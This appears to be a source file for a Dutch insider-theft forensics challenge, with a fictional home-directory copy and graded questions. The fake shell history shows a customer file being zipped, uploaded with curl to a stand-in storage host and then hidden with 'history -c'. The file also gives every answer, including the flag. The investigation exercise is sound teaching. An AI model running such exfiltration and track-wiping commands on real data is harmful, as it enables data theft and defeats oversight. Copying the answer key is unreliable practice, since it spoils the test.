/* Uitdaging ★ — Het lege bureau (zonder handleiding) */

// Alles FICTIEF. Kopie van de thuismap op de bedrijfsserver, veiliggesteld met toestemming van de directie.
const UHB_FS = {
  '/srv/kopie-rvos/LEESMIJ-onderzoek.txt': 'Kopie van /home/rvos op app01, veiliggesteld op 28-07-2026 in opdracht van de directie van Kade Transport BV.\nTijdzone van de server: UTC.\n',
  '/srv/kopie-rvos/notities.txt': 'boodschappen: melk, koffie\nvragen aan IT: nieuwe laptop?\noverdracht regelen voor vertrek\n',
  '/srv/kopie-rvos/.bash_history': 'ls\ncd /srv/crm/export\nls -la\ncd ~\nzip -r overdracht.zip /srv/crm/export/klanten_2026.csv\nls -la overdracht.zip\ncurl -s -T overdracht.zip https://upload.opslagbox.example/u/r-v/overdracht.zip\nrm overdracht.zip\necho VGsxN1pIVmlZbVZzWDJsdVoyVndZV3QwZlFvPQ== > .cache/.k\nhistory -c\n',
  '/srv/kopie-rvos/.cache/.k': 'VGsxN1pIVmlZbVZzWDJsdVoyVndZV3QwZlFvPQ==\n',
  '/srv/kopie-rvos/.cache/thumbnails/': null,
  '/srv/kopie-rvos/Documenten/agenda.ics': 'BEGIN:VCALENDAR\nVERSION:2.0\nBEGIN:VEVENT\nUID:5f1e-overdracht@agenda.nm.lab\nDTSTART;TZID=Europe/Amsterdam:20260714T213000\nDTEND;TZID=Europe/Amsterdam:20260714T220000\nSUMMARY:Overdracht\nLOCATION:Parkeerplaats Kade 4\nEND:VEVENT\nBEGIN:VEVENT\nUID:77aa-tandarts@agenda.nm.lab\nDTSTART;TZID=Europe/Amsterdam:20260716T090000\nSUMMARY:Tandarts\nEND:VEVENT\nEND:VCALENDAR\n',
  '/srv/kopie-rvos/Documenten/sollicitatie_concurrent.txt': 'Aan: HR, Transport Noord BV\nOnderwerp: sollicitatie accountmanager\nIk kan direct beginnen en neem een flink klantenbestand mee.\n',
  '/srv/kopie-rvos/Downloads/': null,
};

CS.registerRoom({
  id: 'uitdaging-het-lege-bureau',
  path: 'uitdagingen',
  order: 1,
  title: '★ Het lege bureau',
  icon: '🗄️',
  difficulty: 'Gemiddeld',
  minutes: 40,
  summary: 'Een accountmanager is vertrokken en HR vermoedt dat hij klantgegevens heeft meegenomen. Je hebt een kopie van zijn thuismap. Geen stappenplan: zoek zelf uit wat er gebeurde.',
  objectives: [
    'Zelfstandig een thuismap doorzoeken, ook op verborgen bestanden',
    'Uit een commandogeschiedenis afleiden wat iemand deed, en wat hij probeerde te verbergen',
    'Gelaagde codering herkennen en afpellen',
    'Tijden uit verschillende tijdzones naar UTC omrekenen',
  ],
  terms: [
    { term: 'Thuismap', def: 'De persoonlijke map van een gebruiker op een Linux-systeem, met daarin ook verborgen bestanden (namen die met een punt beginnen).' },
    { term: 'Commandogeschiedenis', def: 'Een bestand waarin de shell de getypte commando\'s bewaart, tenzij de gebruiker dat uitzet of wist.' },
    { term: 'iCalendar (.ics)', def: 'Standaardformaat voor agenda-afspraken; tijden staan erin met een tijdzone (TZID) of in UTC (eindigend op Z).' },
  ],
  resources: [
    { title: 'RFC 5545 — iCalendar', url: 'https://www.rfc-editor.org/rfc/rfc5545' },
  ],
  tasks: [
    {
      title: 'Opdracht',
      content: `
        <p>R. Vos, accountmanager bij het fictieve Kade Transport BV, vertrok eind juli zonder afscheid. HR vermoedt dat hij
        klantgegevens heeft meegenomen naar een concurrent. De directie heeft zijn thuismap op de applicatieserver laten
        veiligstellen en vraagt jou om vast te stellen wat er is gebeurd.</p>
        <p>Je werkt op een kopie. Beantwoord de vragen. Er is geen stappenplan.</p>
      `,
      lab: {
        type: 'terminal',
        user: 'onderzoeker', host: 'forensisch-01',
        home: '/srv/kopie-rvos', cwd: '/srv/kopie-rvos',
        motd: 'Alleen-lezen kopie. Typ help voor de beschikbare commando\'s.',
        fs: UHB_FS,
      },
      questions: [
        { q: 'Naar welk domein zijn de gegevens verstuurd?', answer: ['upload.opslagbox.example', 'opslagbox.example'], hint: 'Niet alles wat iemand typt, verdwijnt.', explain: 'In .bash_history staat een curl -T (upload) naar upload.opslagbox.example.' },
        { q: 'Welk bronbestand zat in het archief? (bestandsnaam)', answer: ['klanten_2026.csv'], hint: 'Wat werd er ingepakt?', explain: 'zip -r overdracht.zip /srv/crm/export/klanten_2026.csv' },
        { q: 'Welke vlag liet hij achter?', answer: ['NM{dubbel_ingepakt}'], encoded: true, hint: 'Eén keer uitpakken is soms niet genoeg.', explain: 'In .cache/.k staat Base64 van Base64: cat .cache/.k | base64 -d | base64 -d.', xp: 25 },
        { q: 'Hoe laat (UTC, UU:MM) vond de afspraak "Overdracht" plaats?', answer: ['19:30', '1930'], hint: 'Let op de tijdzone en het seizoen.', explain: '21:30 in Europe/Amsterdam op 14 juli (zomertijd, UTC+2) is 19:30 UTC.' },
        { q: 'Met welk commando probeerde hij zijn sporen te wissen (het laatste in de geschiedenis)?', answer: ['history -c'], hint: 'Kijk naar de laatste regel.', explain: 'history -c wist alleen de geschiedenis in het geheugen. Deze server schreef elk commando direct weg naar .bash_history (bijvoorbeeld met PROMPT_COMMAND="history -a"), dus alles stond er al. Een klassieke vergissing.' },
      ],
    },
  ],
});
